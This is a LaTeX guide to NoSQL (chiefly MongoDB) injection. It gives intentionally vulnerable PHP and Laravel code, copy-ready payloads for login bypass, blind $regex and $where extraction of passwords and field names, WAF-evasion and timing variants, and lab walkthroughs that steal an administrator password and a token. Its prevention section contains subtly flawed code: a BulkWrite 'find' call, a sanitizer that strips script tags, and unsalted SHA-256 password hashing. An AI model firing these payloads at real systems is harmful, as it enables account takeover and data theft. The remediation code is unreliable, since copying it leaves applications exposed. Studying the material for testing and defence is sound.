\documentclass[12pt]{article}

\usepackage[a4paper,margin=0.5in]{geometry}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{hyperref}
\usepackage{enumitem}
\usepackage{titlesec}
\usepackage{tcolorbox}
\usepackage{longtable}
\usepackage{multicol}
\usepackage{booktabs}
\usepackage{listings}
\usepackage{amssymb}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
\definecolor{infoboxcolor}{rgb}{0.9,0.95,1}
\definecolor{warningcolor}{rgb}{1,0.95,0.9}
\definecolor{criticalcolor}{rgb}{1,0.9,0.9}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{blue},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\small,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2
}

\lstset{style=mystyle}

% Custom boxes
\newtcolorbox{infobox}[1][]{colback=infoboxcolor,colframe=blue!50!black,title=#1,boxrule=1pt}
\newtcolorbox{warningbox}[1][]{colback=warningcolor,colframe=orange!50!black,title=#1,boxrule=1pt}
\newtcolorbox{criticalbox}[1][]{colback=criticalcolor,colframe=red!50!black,title=#1,boxrule=1pt}

\title{NoSQL Injection Complete Guide}
\author{Eyad Islam El-Taher}
\date{\today}

\begin{document}

\maketitle
\tableofcontents
\newpage

% ==================================================
\section{What is NoSQL}

\subsection{Definition}

NoSQL (Not Only SQL) databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits.

\subsection{Types of NoSQL Databases}

\begin{longtable}{|l|l|l|}
\hline
\textbf{Type} & \textbf{Examples} & \textbf{Query Language} \\
\hline
Document Store & MongoDB, CouchDB & JSON-based queries \\
\hline
Key-Value Store & Redis, DynamoDB & GET/PUT operations \\
\hline
Column Family & Cassandra, HBase & CQL \\
\hline
Graph Database & Neo4j, ArangoDB & Cypher, Gremlin \\
\hline
\end{longtable}

\subsection{How NoSQL Differs from SQL}

\begin{itemize}
    \item No fixed schema required
    \item No joins (usually)
    \item Horizontal scaling
    \item JSON/BSON data format
    \item Query operators instead of SQL keywords
    \item JavaScript execution in queries (MongoDB)
\end{itemize}

\begin{infobox}[Key Difference]
Unlike SQL databases that use a universal query language, NoSQL databases use a variety of query languages, making injection attacks different for each database type.
\end{infobox}

% ==================================================
\section{What is NoSQL Injection}

\subsection{Definition}

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. This occurs when user input is not properly sanitized before being used in database queries.

\subsection{Impact}

NoSQL injection may enable an attacker to:

\begin{itemize}
    \item Bypass authentication or protection mechanisms
    \item Extract or edit data
    \item Cause a denial of service
    \item Execute code on the server (in some cases)
    \item Access unauthorized information
\end{itemize}

\subsection{Types of NoSQL Injection}

\begin{enumerate}
    \item \textbf{Syntax Injection} - Breaking the query syntax to inject malicious payloads
    \item \textbf{Operator Injection} - Using NoSQL query operators like \$ne, \$gt, \$regex, \$where
\end{enumerate}

% ==================================================
\section{Where to Find NoSQL Injection}

\subsection{Common Locations}

\begin{itemize}
    \item Login forms (authentication bypass)
    \item Search functionality
    \item Product filters and categories
    \item User profile lookups
    \item API endpoints using JSON
    \item Applications using MongoDB, CouchDB, or other NoSQL databases
\end{itemize}

\subsection{How to Identify NoSQL Usage}

Look for these indicators:

\begin{itemize}
    \item JSON responses with MongoDB-specific fields (\_id, ObjectId)
    \item URL parameters using bracket notation (user[\$ne]=admin)
    \item API endpoints accepting JSON in request body
    \item Responses containing error messages mentioning MongoDB, CouchDB, etc.
\end{itemize}

% ==================================================
\section{Vulnerable Code Examples}

\subsection{PHP with MongoDB}

\begin{lstlisting}[language=PHP, caption=Vulnerable PHP/MongoDB Code]
<?php
// Vulnerable: Direct concatenation of user input
$username = $_POST['username'];
$password = $_POST['password'];

$collection = (new MongoDB\Client)->app->users;
$query = ['username' => $username, 'password' => $password];

// No sanitization - vulnerable to operator injection
$user = $collection->findOne($query);

if ($user) {
    $_SESSION['user'] = $user;
    echo "Login successful";
} else {
    echo "Invalid credentials";
}
?>
\end{lstlisting}

\begin{lstlisting}[language=PHP, caption=Vulnerable Search Function]
<?php
// Vulnerable search with $where operator
$category = $_GET['category'];
$collection = (new MongoDB\Client)->shop->products;

// Direct string concatenation in $where
$query = ['$where' => "this.category == '$category'"];
$products = $collection->find($query);

foreach ($products as $product) {
    echo $product['name'] . "<br>";
}
?>
\end{lstlisting}

\subsection{Laravel (MongoDB with Eloquent)}

\begin{lstlisting}[language=PHP, caption=Vulnerable Laravel/MongoDB Code]
<?php
namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        // Vulnerable: No input sanitization
        $username = $request->input('username');
        $password = $request->input('password');
        
        // This is vulnerable to operator injection
        $user = User::where('username', $username)
                    ->where('password', $password)
                    ->first();
        
        if ($user) { return redirect('/dashboard'); }
        
        return back()->with('error', 'Invalid credentials');
    }
    
    public function search(Request $request)
    {
        // Vulnerable search with regex
        $query = $request->input('q');
        
        // Direct use of user input
        $products = Product::where('name', 'like', "%$query%")->get();
        
        // In MongoDB driver, this becomes regex injection
        return view('search', ['products' => $products]);
    }
}
?>
\end{lstlisting}

\begin{warningbox}[Laravel Specific]
When using MongoDB with Laravel (jenssegers/laravel-mongodb), the same operator injection vulnerabilities exist as in raw MongoDB.
\end{warningbox}

% ==================================================
\section{Detection of NoSQL Injection}

\subsection{Syntax Injection Detection}

Test with fuzz strings that break query syntax:

\begin{lstlisting}
# MongoDB fuzz strings
'
"
\'
\"
`
`
{
;
$Foo
\xYZ
%00
\end{lstlisting}

\subsection{URL-Encoded Payload Example}

\begin{lstlisting}
https://insecure.com/products?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
\end{lstlisting}

\subsection{Conditional Behavior Test}

Test with true/false conditions:

\begin{lstlisting}
# False condition
/products?category=fizzy'+%26%26+0+%26%26+'x

# True condition
/products?category=fizzy'+%26%26+1+%26%26+'x
\end{lstlisting}

If responses differ, the application may be vulnerable.

\subsection{Null Byte Injection}

Test with null character:

\begin{lstlisting}
/products?category=fizzy'%00
\end{lstlisting}

MongoDB may ignore characters after null byte, potentially bypassing additional conditions.

\subsection{Operator Injection Detection}

Test with query operators:

\begin{lstlisting}
# Original request
{"username":"admin","password":"password"}

# Test with $ne operator
{"username":{"$ne":"invalid"},"password":"password"}
{"username":"admin","password":{"$ne":"invalid"}}
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
\end{lstlisting}

% ==================================================
\section{When to Search for NoSQL Injection}

\subsection{Indicators}

Look for NoSQL injection when:

\begin{itemize}
    \item Application uses MongoDB, CouchDB, or other NoSQL databases
    \item API endpoints accept JSON input
    \item Login forms without SQL error messages
    \item Search functionality with advanced filters
    \item User profile lookup by username
    \item Applications that use JavaScript-based queries
\end{itemize}

\subsection{Common Parameter Names}

\begin{multicols}{3}
\begin{itemize}
    \item username
    \item user
    \item email
    \item password
    \item pass
    \item search
    \item q
    \item category
    \item filter
    \item id
    \item \_id
    \item token
\end{itemize}
\end{multicols}

% ==================================================
\section{Operator Injection}

\subsection{Common MongoDB Operators}

\begin{longtable}{|l|l|l|}
\hline
\textbf{Operator} & \textbf{Description} & \textbf{Example} \\
\hline
\$ne & Not equal & \{"price": \{"\$ne": 0\}\} \\
\hline
\$gt & Greater than & \{"age": \{"\$gt": 18\}\} \\
\hline
\$lt & Less than & \{"age": \{"\$lt": 65\}\} \\
\hline
\$regex & Regular expression & \{"name": \{"\$regex": "\^{}A.*"\}\} \\
\hline
\$in & In array & \{"role": \{"\$in": ["admin", "user"]\}\} \\
\hline
\$nin & Not in array & \{"status": \{"\$nin": ["banned"]\}\} \\
\hline
\$where & JavaScript expression & \{"\$where": "this.age > 18"\} \\
\hline
\$exists & Field exists & \{"email": \{"\$exists": true\}\} \\
\hline
\$type & Field type & \{"\_id": \{"\$type": "objectId"\}\} \\
\hline
\end{longtable}

\subsection{Operator Injection Examples}

\subsubsection{URL Parameter Injection}

\begin{lstlisting}
# Original
/user?username=admin

# Operator injection
/user?username[$ne]=invalid
/user?username[$gt]=a
/user?username[$regex]=^admin
\end{lstlisting}

\subsubsection{JSON Body Injection}

\begin{lstlisting}
# Original
{"username": "admin", "password": "pass"}

# Operator injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": "wrong"}}
\end{lstlisting}

% ==================================================
\section{Authentication Bypass}

\subsection{Basic Bypass Techniques}

\subsubsection{URL-Encoded POST Data}

\begin{lstlisting}
# Bypass with $ne
username[$ne]=toto&password[$ne]=toto

# Bypass with regex
username[$regex]=a.*&password[$ne]=lol

# Bypass with range
username[$gt]=admin&username[$lt]=test&password[$ne]=1

# Bypass with $nin
username[$nin][]=admin&username[$nin][]=test&password[$ne]=toto
\end{lstlisting}

\subsubsection{JSON Data}

\begin{lstlisting}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}}
\end{lstlisting}

\newpage
\subsection{Authentication Bypass Example}

\begin{lstlisting}
POST /login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
\end{lstlisting}

This query returns all users where both username and password are not equal to "invalid", logging you in as the first user in the collection.

% ==================================================
\section{Extract Length Information}

\subsection{Using \$regex for Length Detection}

\subsubsection{URL Parameter}

\begin{lstlisting}
# Test if password length is 1
user=admin&password[$regex]=.{1}

# Test if password length is 3
user=admin&password[$regex]=.{3}
\end{lstlisting}

\subsubsection{JSON Body}

\begin{lstlisting}
{"username": "admin", "password": {"$regex": "^.{8}$"}}
{"username": "admin", "password": {"$regex": "^.{0,20}$"}}
\end{lstlisting}


% ==================================================
\section{Extract Data Information}

\subsection{Using \$regex for Character Extraction}

\subsubsection{URL Parameter}

\begin{lstlisting}
# Extract password character by character
user=admin&password[$regex]=^m
user=admin&password[$regex]=^md
user=admin&password[$regex]=^mdp
user=admin&password[$regex]=^mdp.
user=admin&password[$regex]=^mdp.s
\end{lstlisting}

\subsubsection{JSON Body}

\begin{lstlisting}
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ad"}}
{"username": "admin", "password": {"$regex": "^adm"}}
{"username": "admin", "password": {"$regex": "^admi"}}
\end{lstlisting}

\subsection{Using \$in for Enumeration}

\begin{lstlisting}
{"username": {"$in": ["Admin", "4dm1n", "admin", "root", "administrator"]}, "password": {"$gt": ""}}
\end{lstlisting}

\subsection{Using \$where for JavaScript Injection}

\begin{lstlisting}
# Extract first character of password
{"$where": "this.username == 'admin' && this.password[0] == 'a'"}

# Extract password using match()
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
\end{lstlisting}


\subsection{Extracting Field Names}

\begin{lstlisting}
# Extract first field name character by character
{"$where": "Object.keys(this)[0].match('^.{0}a.*')"}

# Extract specific field index
{"$where": "Object.keys(this)[1].match('^password.*')"}
\end{lstlisting}

% ==================================================
\section{WAF and Bypassing Filters}

\subsection{Duplicate Key Precedence}

In MongoDB, if a document contains duplicate keys, only the last occurrence takes precedence.

\begin{lstlisting}
# Bypass WAF by adding duplicate keys
{"id":"10", "id":{"$ne":null}}
{"username":"guest", "username":{"$ne":"invalid"}, "password":"pass"}
\end{lstlisting}

\subsection{Alternative Encodings}

\begin{lstlisting}
# Unicode encoding
%uff0e%uff0e%uff0f
%c0%ae%c0%ae%c0%af

# URL encoding variations
%245b%5d   # $ne encoded
%24ne      # Partial encoding
\end{lstlisting}

\subsection{Case Manipulation}

\begin{lstlisting}
# Some parsers are case-insensitive
{"username": {"$NE": "invalid"}}
{"username": {"$nE": "invalid"}}
{"username": {"$Ne": "invalid"}}
\end{lstlisting}

\subsection{Whitespace Bypass}

\begin{lstlisting}
# Add whitespace characters
{"username":{"$ne": "invalid"},"password":"pass"}
{"username" : {"$ne" : "invalid"}, "password" : "pass"}
{"username":\t{"$ne":\n"invalid"}}
\end{lstlisting}

\subsection{JSON Variations}

\begin{lstlisting}
# Single quotes instead of double quotes
{'username': {'$ne': 'invalid'}}

# No quotes around keys
{username: {$ne: "invalid"}}

# Mixed quoting
{"username": {'$ne': "invalid"}}
\end{lstlisting}

\subsection{Timing-Based Blind NoSQL}

\begin{lstlisting}
# Timing attack with sleep
{"$where": "sleep(5000)"}
{"$where": "function() { var waitTill = new Date(new Date().getTime() + 5000); while (waitTill > new Date()) {}; return true; }"}

# Conditional timing
{"$where": "if(this.password[0] == 'a') { sleep(5000) }"}
admin' && function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
\end{lstlisting}

% ==================================================
\section{Examples}

\subsection{Lab Example 1: Extract Administrator Password}

\begin{lstlisting}
# Step 1: Test for injection
GET /user/lookup?user=wiener' HTTP/1.1

# Step 2: Test boolean conditions
GET /user/lookup?user=wiener'+%26%26+'1'%3d%3d'2 HTTP/1.1
GET /user/lookup?user=wiener'+%26%26+'1'%3d%3d'1 HTTP/1.1

# Step 3: Find password length
GET /user/lookup?user=administrator'+%26%26+this.password.length+%3c+30+||+'a'%3d%3d'b HTTP/1.1

# Step 4: Extract password characters
GET /user/lookup?user=administrator'+%26%26+this.password[0]%3d%3d'a'+||+'a'%3d%3d'b HTTP/1.1
\end{lstlisting}

\subsection{Lab Example 2: Extract Unknown Fields}

\begin{lstlisting}
# Step 1: Test operator injection
POST /login HTTP/1.1
{"username":"carlos","password":{"$ne":"invalid"}}

# Step 2: Test $where injection
POST /login HTTP/1.1
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}

# Step 3: Extract field names
POST /login HTTP/1.1
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "Object.keys(this)[1].match('^.{0}a.*')"}

# Step 4: Extract token value
POST /login HTTP/1.1
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "this.YOURTOKEN.match('^.{0}a.*')"}
\end{lstlisting}

% ==================================================
\section{Methodology}

\subsection{Testing Workflow}

\begin{enumerate}
    \item \textbf{Identify NoSQL usage}
    \begin{itemize}
        \item Check for MongoDB error messages
        \item Look for JSON-based APIs
        \item Identify bracket notation in parameters
    \end{itemize}
    
    \item \textbf{Test for syntax injection}
    \begin{itemize}
        \item Submit fuzz strings
        \item Look for error messages
        \item Test boolean conditions
    \end{itemize}
    
    \item \textbf{Test for operator injection}
    \begin{itemize}
        \item Try \$ne, \$gt, \$lt operators
        \item Test authentication bypass
        \item Attempt to extract data
    \end{itemize}
    
    \item \textbf{Exploit if vulnerable}
    \begin{itemize}
        \item Extract length information
        \item Extract data using regex
        \item Use blind techniques if needed
    \end{itemize}
    
    \item \textbf{Report findings}
    \begin{itemize}
        \item Document vulnerable parameters
        \item Provide proof of concept
        \item Suggest remediation
    \end{itemize}
\end{enumerate}

\subsection{Testing Checklist}

\begin{longtable}{|p{5cm}|p{5cm}|}
\hline
\textbf{Test} & \textbf{Status} \\
\hline
Identify NoSQL database type & $\square$ \\
\hline
Test syntax injection with fuzz strings & $\square$ \\
\hline
Test boolean conditions & $\square$ \\
\hline
Test \$ne operator for auth bypass & $\square$ \\
\hline
Test \$regex for data extraction & $\square$ \\
\hline
Test \$where for JavaScript injection & $\square$ \\
\hline
Test null byte injection & $\square$ \\
\hline
Extract password length & $\square$ \\
\hline
Extract password characters & $\square$ \\
\hline
Extract field names & $\square$ \\
\hline
Test timing-based injection & $\square$ \\
\hline
\end{longtable}

% ==================================================
\section{Prevention and Mitigation}

\subsection{Input Validation}

\subsubsection{Whitelist Approach}

\begin{lstlisting}[language=PHP]
<?php
// Whitelist allowed values
$allowed_users = ['admin', 'user', 'guest'];
$username = $_POST['username'];

if (!in_array($username, $allowed_users)) {
    die('Invalid input');
}

// Safe query
$collection->findOne(['username' => $username]);
?>
\end{lstlisting}

\subsubsection{Type Casting}

\begin{lstlisting}[language=PHP]
<?php
// Force integer type
$id = (int)$_GET['id'];
$collection->findOne(['_id' => $id]);

// Force string type
$username = (string)$_POST['username'];
$collection->findOne(['username' => $username]);
?>
\end{lstlisting}

\subsection{Parameterized Queries}

\begin{lstlisting}[language=PHP]
<?php
// Use MongoDB\Driver\Manager with options
$manager = new MongoDB\Driver\Manager("mongodb://localhost:27017");

$bulk = new MongoDB\Driver\BulkWrite;
$bulk->find(['username' => ['$eq' => $username]]);

// Use query builders that escape input
use Jenssegers\Mongodb\Eloquent\Model;

class User extends Model {
    protected $connection = 'mongodb';
}

// Laravel's query builder escapes input
$user = User::where('username', $username)->first();
?>
\end{lstlisting}

\subsection{Disable Dangerous Features}

\subsubsection{MongoDB Configuration}

\begin{lstlisting}
// Disable $where operator (requires restart)
mongod --noscripting

// In mongod.conf
security:
    javascriptEnabled: false
\end{lstlisting}

\subsection{Input Sanitization}

\begin{lstlisting}[language=PHP]
<?php
function sanitize_nosql($input) {
    // Remove query operators
    $input = preg_replace('/\$[a-zA-Z]+/', '', $input);
    
    // Remove JavaScript
    $input = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $input);
    
    // Escape special characters
    $input = addslashes($input);
    
    return $input;
}

$username = sanitize_nosql($_POST['username']);
?>
\end{lstlisting}

\subsection{Laravel Specific Prevention}

\begin{lstlisting}[language=PHP]
<?php

// Use validation rules
$request->validate([
    'username' => 'required|string|alpha_num|max:255',
    'email' => 'required|email',
    'id' => 'required|integer'
]);


// Use Eloquent properly
$user = User::where('username', $request->username)
            ->where('password', hash('sha256', $request->password))
            ->first();

// Avoid using raw expressions
// BAD: User::whereRaw("username = '$username'")
// GOOD: User::where('username', $username)
?>
\end{lstlisting}

\subsection{Mitigation Checklist}

\begin{longtable}{|p{5cm}|p{5cm}|}
\hline
\textbf{Control} & \textbf{Status} \\
\hline
Input validation with whitelist & $\square$ \\
\hline
Type casting for numeric inputs & $\square$ \\
\hline
Parameterized queries & $\square$ \\
\hline
Disable \$where operator & $\square$ \\
\hline
Input sanitization & $\square$ \\
\hline
ObjectID validation & $\square$ \\
\hline
Query result limits & $\square$ \\
\hline
Security logging & $\square$ \\
\hline
Regular security testing & $\square$ \\
\hline
Use of ORM/ODM properly & $\square$ \\
\hline
\end{longtable}

\begin{criticalbox}[Key Takeaway]
The most effective prevention for NoSQL injection is to:
\begin{enumerate}
    \item Never trust user input
    \item Use whitelists for allowed values
    \item Type cast inputs to expected types
    \item Disable dangerous JavaScript execution
    \item Use parameterized queries when available
\end{enumerate}
\end{criticalbox}

\begin{infobox}[Tools Reference]
Useful tools for NoSQL injection testing:
\begin{itemize}
    \item \textbf{NoSQLmap} - Automated NoSQL exploitation
    \item \textbf{Burp NoSQLi Scanner} - Burp extension
\end{itemize}
\end{infobox}

\end{document}
